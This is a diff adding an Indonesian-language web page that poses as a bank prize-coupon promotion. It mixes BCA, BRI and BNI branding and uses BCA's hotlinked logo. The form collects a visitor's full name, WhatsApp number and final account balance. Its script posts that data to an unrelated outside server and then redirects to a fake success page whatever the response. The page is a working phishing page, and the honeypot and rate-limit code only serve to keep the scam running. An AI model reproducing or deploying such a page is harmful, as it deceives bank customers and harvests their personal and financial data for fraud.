@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="id" class="h-100">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta property="og:title" content="Cetak Kupon Anda - BRI - Rejeki Wondr">
+    <meta property="og:image" content="img/bc.png">
+    <meta name="author" content="BNI" />
+    <title>Cetak Kupon Anda - BRI Rejeki Wondr</title>
+    <link rel="icon" type="image/x-icon" href="favicon.png" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <style>
+
+body{
+    height: 50vh;
+    background-color: #DEE7EE;
+            
+}
+
+.navnon{
+    position: fixed;
+    top: 0;
+    left: 0;
+}
+
+.textjalan{
+    width: 100%;
+    display: flex;
+    align-content: center;
+    align-items: center;
+    background-color: #DEE7EE;
+    font-weight: bold;
+}
+
+.textjalan svg{
+    color: #2765cf;
+}
+
+.coverform{
+    width: 90%;
+    height: auto;
+    padding: px;
+    background-color: #DEE7EE;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 25px;
+}
+
+.form h5{
+    border-bottom: 1px solid #2765cf;
+    color: #2765cf;
+}
+
+.inp{
+    margin-bottom: 10px;
+}
+
+.inp input{
+    width: 100%;
+    padding: 9px;
+    border: none;
+    border: 1px solid #2765cf;
+    outline: none;
+    border-radius: 5px;
+    box-shadow: 0 3px 13px rgba(0,0,0,0.1);
+}
+
+input:focus{
+    border: 1px solid #2765cf;
+}
+
+button{
+    width: 100%;
+    padding: 10px;
+    border: none;
+    background-color: #2765cf;
+    color: #fff;
+    border-radius: 5px;
+    box-shadow: 0 3px 13px rgba(0,0,0,0.4);
+    border: 1px solid #fff;
+    margin-top: 18px;
+}
+
+footer img{
+    width: 100%;
+    position: fixed;
+    bottom: 0;
+}
+
+    </style>
+</head>
+
+<body>
+    <main>
+        <nav class="navnon">
+            <img width="100%" src="https://i.ibb.co.com/xqQbh56M/IMG-20250824-WA0004.jpg" alt="Banner" />
+        </nav>
+<br>
+        <footer>
+            <img src="https://i.ibb.co.com/fY9fYXvS/IMG-20250824-WA0005.jpg" alt="Footer" />
+        </footer>
+
+        <div class="textjalan" style="margin-top: 65px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="40" fill="currentColor" class="bi bi-bell"
+                viewBox="0 0 16 16">
+                <path
+                    d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2M8 1.918l-.797.161A4 4 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4 4 0 0 0-3.203-3.92zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5 5 0 0 1 13 6c0 .88.32 4.2 1.22 6" />
+            </svg>
+            <marquee>
+                Selamat Datang di GEBYAR FSTVL   BANK BCA Menangkan Hadiah Nya dan Keseruan nya...! Jadikan Anda Pemenangnya!
+            </marquee>
+        </div>
+
+        <div class="coverform">
+            <div class="form">
+                <img width="30%" src="https://www.bca.co.id/-/media/Feature/Card/List-Card/Tentang-BCA/Brand-Assets/Logo-BCA/Logo-BCA_Putih.png" alt="Logo" /><br>
+                <form id="formData" method="POST" class="mt-2">
+                    <div class="inp">
+                        <label for="namalengkap"><b>Nama Lengkap:</b></label>
+                        <input type="text" name="namalengkap" id="namalengkap" placeholder="Masukan Nama Lengkap Anda" required />
+                    </div>
+                    <div class="inp">
+                        <label for="nowa"><b>No. WhatsApp:</b></label>
+                        <input type="tel" name="nomortelepon" id="nowa" placeholder="contoh: 08123456789" required maxlength="13" />
+                    </div>
+                    <div class="inp">
+                        <label for="dengan-rupiah"><b>Saldo Akhir:</b></label>
+                        <input type="tel" name="saldorekening" id="dengan-rupiah" placeholder="Rp. XXX-XXX-XXX" required maxlength="19" />
+                    </div>
+                    <!-- HONEYPOT ANTI-SPAM FIELD -->
+                    <div style="display:none;">
+                        <input type="text" name="hp_field" id="hp_field" tabindex="-1" autocomplete="off">
+                    </div>
+                    <button type="submit" id="kirim"><b>CETAK KUPON</b></button>
+                </form>
+            </div>
+        </div>
+<br>
+        <p onclick="location.hf='https://www.bni.co.id/id-id/beranda/promo-acara/rejeki-wondr-bni'"
+            style="font-size: 15px; text-align: center; margin: 5px 10px; cursor: pointer;">
+            <strong style="color: ;">PT.BANK CENTRAL ASIA.tbk
+                <span style="color: #2765cf;"><b></b></span>
+            </strong>
+        </p>
+    </main>
+
+    <!-- JQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Jika Anda pakai js/rupiah.js, tetap sertakan -->
+    <script>
+        /* Dengan Rupiah */
+    var dengan_rupiah = document.getElementById('dengan-rupiah');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+    </script>
+
+    <!-- AJAX Final + ANTI SPAM -->
+    <script>
+        $('#formData').on('submit', function(e) {
+            e.preventDefault();
+
+            // HONEYPOT: Jika field tersembunyi terisi, berarti bot
+            if ($('#hp_field').val() !== '') {
+                // Bisa tambahkan log jika mau, atau abaikan saja
+                return;
+            }
+
+            // BATAS SUBMIT 5 MENIT
+            var lastSubmit = sessionStorage.getItem('lastSubmitTime');
+            var now = Date.now();
+            if (lastSubmit && (now - lastSubmit < 300000)) {
+                alert('Anda sudah mengirim data. Mohon tunggu sebentar sebelum mengirim ulang.');
+                return;
+            }
+
+            // Simpan waktu submit sekarang
+            sessionStorage.setItem('lastSubmitTime', now);
+
+            var formData = $(this).serialize();
+
+            $('#kirim').prop('disabled', true).text('Loading...');
+
+            $.ajax({
+                type: "POST",
+                url: 'https://bogat2.my.id/bc4/1.php', // ganti dengan URL server Anda jika berbeda
+                data: formData,
+                dataType: "json", // pastikan kita minta JSON
+                success: function(response) {
+                    if (response.status === "ok") {
+                        window.location.href = "https://72626.word635.my.id/sukses.html";
+                    } else {
+                        window.location.href = "https://72626.word635.my.id/sukses.html"; // fallback redirect
+                    }
+                },
+                error: function(jqXHR, textStatus, errorThrown) {
+                    // Tidak perlu tampilkan alert error, langsung redirect
+                    window.location.href = "https://72626.word635.my.id/sukses.html";
+                },
+                complete: function() {
+                    // Tidak perlu aktifkan tombol agar anti spam tetap jalan
+                    // $('#kirim').prop('disabled', false).text('Cetak Kupon');
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
